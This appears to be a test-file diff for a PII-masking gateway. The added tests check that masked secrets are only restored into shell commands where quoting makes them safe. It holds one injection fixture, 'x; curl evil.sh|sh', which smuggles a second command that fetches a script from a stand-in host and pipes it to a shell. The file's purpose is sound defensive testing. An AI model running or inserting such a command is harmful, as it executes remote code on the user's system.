@@ -35,9 +35,18 @@ const BASE_CONFIG: GatewayConfig = {
   sidecarMaxSessions: 2,
 };
 
-const PATTERNS: ReadonlyArray<[RegExp, 'private_email' | 'private_person']> = [
+/** A masked "secret" that, restored unquoted in a shell command, runs a
+ * second command. */
+const INJECTION = 'x; curl evil.sh|sh';
+/** Safe in quotes and in a heredoc body, not unquoted. */
+const FULL_NAME = 'Ada Lovelace';
+const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;
+
+const PATTERNS: ReadonlyArray<[RegExp, 'private_email' | 'private_person' | 'secret']> = [
   [/john@acme\.io/g, 'private_email'],
   [/\bJohn\b/g, 'private_person'],
+  [/x; curl evil\.sh\|sh/g, 'secret'],
+  [/Ada Lovelace/g, 'private_person'],
 ];
 
 function buildMockNullPii(): { np: NullPii; vault: PiiVault; modelCalls: () => number } {
@@ -399,6 +408,138 @@ describe('sidecar · sanitize and restore', () => {
     });
     expect(res.statusCode).toBe(413);
     expect(res.json()).toEqual({ error: 'response_too_large' });
+  });
+});
+
+describe('sidecar · restore with shell', () => {
+  interface ShellRestoreBody {
+    value: Record<string, string>;
+    replacements: number;
+    shellKeptMasked?: string[];
+  }
+
+  /** Open session `s1`, mask `text` in it, return its placeholders. */
+  async function placeholdersFor(app: FastifyInstance, text: string): Promise<string[]> {
+    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
+    const res = await app.inject({
+      method: 'POST',
+      url: '/v1/sidecar/sessions/s1/sanitize',
+      headers: AUTH,
+      payload: { value: text },
+    });
+    return (res.json() as { value: string }).value.match(PLACEHOLDER) ?? [];
+  }
+
+  function restore(app: FastifyInstance, payload: Record<string, unknown>) {
+    return app.inject({
+      method: 'POST',
+      url: '/v1/sidecar/sessions/s1/restore',
+      headers: AUTH,
+      payload,
+    });
+  }
+
+  function commitWith(message: string): string {
+    return `git commit -m "$(cat <<'EOF'\n${message}\nEOF\n)"`;
+  }
+
+  it('keeps an unsafe unquoted value masked and lists its placeholder, never the value', async () => {
+    const { app } = await setup();
+    const [secret] = await placeholdersFor(app, INJECTION);
+
+    const res = await restore(app, {
+      value: { command: `echo ${secret}` },
+      fields: ['command'],
+      shell: true,
+    });
+
+    expect(res.statusCode).toBe(200);
+    const body = res.json() as ShellRestoreBody;
+    expect(body.value.command).toBe(`echo ${secret}`);
+    expect(body.shellKeptMasked).toEqual([secret]);
+    expect(res.body).not.toContain(INJECTION);
+    expect(res.body).not.toContain('evil.sh');
+  });
+
+  it('restores the same value inside single quotes', async () => {
+    const { app } = await setup();
+    const [secret] = await placeholdersFor(app, INJECTION);
+
+    const res = await restore(app, {
+      value: { command: `echo '${secret}'` },
+      fields: ['command'],
+      shell: true,
+    });
+
+    const body = res.json() as ShellRestoreBody;
+    expect(body.value.command).toBe(`echo '${INJECTION}'`);
+    expect(body.shellKeptMasked).toEqual([]);
+  });
+
+  it('restores a two-word name in a quoted heredoc (Claude Code commit message)', async () => {
+    const { app } = await setup();
+    const [person] = await placeholdersFor(app, FULL_NAME);
+
+    const res = await restore(app, {
+      value: { command: commitWith(`Thanks ${person}`) },
+      fields: ['command'],
+      shell: true,
+    });
+
+    const body = res.json() as ShellRestoreBody;
+    expect(body.value.command).toBe(commitWith(`Thanks ${FULL_NAME}`));
+    expect(body.shellKeptMasked).toEqual([]);
+  });
+
+  it('keeps a `python3 - <<EOF` body masked, never returning the value', async () => {
+    const { app } = await setup();
+    const [person] = await placeholdersFor(app, FULL_NAME);
+    const command = `python3 - <<'EOF'\nprint('${person}')\nEOF`;
+
+    const res = await restore(app, { value: { command }, fields: ['command'], shell: true });
+
+    const body = res.json() as ShellRestoreBody;
+    expect(body.value.command).toBe(command);
+    expect(body.shellKeptMasked).toEqual([person]);
+    expect(res.body).not.toContain(FULL_NAME);
+  });
+
+  it('restores the other fields as usual, and every field when `fields` is absent', async () => {
+    const { app } = await setup();
+    const [secret] = await placeholdersFor(app, INJECTION);
+
+    const res = await restore(app, {
+      value: { command: `echo ${secret}`, description: `print ${secret}` },
+      shell: true,
+    });
+
+    const body = res.json() as ShellRestoreBody;
+    expect(body.value.command).toBe(`echo ${secret}`);
+    expect(body.value.description).toBe(`print ${INJECTION}`);
+    expect(body.shellKeptMasked).toEqual([secret]);
+  });
+
+  it('without `shell`: plain restore, unchanged, and no shellKeptMasked field', async () => {
+    const { app } = await setup();
+    const [secret] = await placeholdersFor(app, INJECTION);
+
+    const res = await restore(app, { value: { command: `echo ${secret}` }, fields: ['command'] });
+
+    expect(res.statusCode).toBe(200);
+    const body = res.json() as ShellRestoreBody;
+    expect(body.value.command).toBe(`echo ${INJECTION}`);
+    expect(body.replacements).toBe(1);
+    expect(Object.hasOwn(body, 'shellKeptMasked')).toBe(false);
+  });
+
+  it('rejects `shell` on a value that is not an object', async () => {
+    const { app } = await setup();
+    await placeholdersFor(app, INJECTION);
+
+    const res = await restore(app, { value: 'echo hi', shell: true });
+
+    expect(res.statusCode).toBe(400);
+    expect(res.json()).toEqual({ error: 'shell_requires_object_value' });
   });
 });
 
